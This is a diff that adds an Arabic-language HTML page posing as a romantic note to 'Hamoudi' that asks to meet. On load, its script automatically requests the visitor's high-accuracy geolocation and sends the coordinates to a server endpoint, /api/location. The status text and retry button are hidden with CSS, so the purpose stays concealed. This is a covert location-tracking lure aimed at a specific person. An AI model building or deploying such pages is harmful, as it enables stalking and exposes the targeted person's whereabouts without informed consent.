@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>أنا بحبك يا حمودي</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, sans-serif;
+      background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      color: white;
+      text-align: center;
+      direction: rtl;
+    }
+    .card {
+      background: rgba(255, 255, 255, 0.15);
+      backdrop-filter: blur(10px);
+      border-radius: 20px;
+      padding: 40px 30px;
+      max-width: 450px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.2);
+    }
+    #status {
+      margin-top: 20px;
+      font-size: 0.95rem;
+      min-height: 24px;
+      line-height: 1.6;
+    }
+    .btn-retry {
+      background: white;
+      color: #e91e63;
+      border: none;
+      padding: 10px 25px;
+      border-radius: 30px;
+      font-size: 1rem;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 15px;
+      transition: transform 0.2s;
+      display: none !important; 
+      
+    }
+    .btn-retry:hover {
+      transform: scale(1.05);
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>🤍 أنا بحبك يا حمودي 🤍</h1>
+    <p>ممكن نتقابل؟ عايزين نتعرف</p>
+    <div id="status" display="none">⏳ جاري طلب الموقع تلقائياً...</div>
+    <button id="retryBtn"  display="none" class="btn-retry">🔄 حاول مرة أخرى</button>
+  </div>
+
+  <script>
+    const statusDiv = document.getElementById('status');
+    const retryBtn = document.getElementById('retryBtn');
+
+    // إرسال الموقع للخادم
+    function sendLocation(latitude, longitude, accuracy) {
+      fetch('/api/location', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ latitude, longitude, accuracy })
+      })
+      .then(response => {
+        if (!response.ok) {
+          return response.json().then(err => { throw new Error(err.error || 'فشل الحفظ'); });
+        }
+        return response.json();
+      })
+      .then(data => {
+        const cityName = data.locationName ? ` (${data.locationName})` : '';
+   
+      })
+      .catch(error => {
+    
+        retryBtn.style.display = 'inline-block';
+      });
+    }
+
+    // طلب الموقع من المتصفح
+    function requestLocation() {
+      if (!navigator.geolocation) {  
+        return;
+      }
+
+      retryBtn.style.display = 'none'; // إخفاء زر إعادة المحاولة
+      statusDiv.style.display = 'none'; // إظهار رسالة الحالة
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const { latitude, longitude, accuracy } = position.coords;
+          sendLocation(latitude, longitude, accuracy);
+        },
+        (error) => {
+          let msg = 'حدث خطأ غير معروف.';
+          switch(error.code) {
+            case error.PERMISSION_DENIED:
+              msg = '⚠️ تم رفض إذن الوصول إلى الموقع. إذا غيرت رأيك، اضغط حاول مرة أخرى.';
+              break;
+            case error.POSITION_UNAVAILABLE:
+              msg = '⚠️ معلومات الموقع غير متاحة حالياً.';
+              break;
+            case error.TIMEOUT:
+              msg = '⚠️ انتهت مهلة طلب الموقع.';
+              break;
+          }
+          statusDiv.textContent = msg;
+          retryBtn.style.display = 'inline-block';
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    }
+
+    // بدء الطلب تلقائياً عند تحميل الصفحة
+    window.addEventListener('load', requestLocation);
+
+    // زر إعادة المحاولة
+    retryBtn.addEventListener('click', requestLocation);
+  </script>
+</body>
+</html>
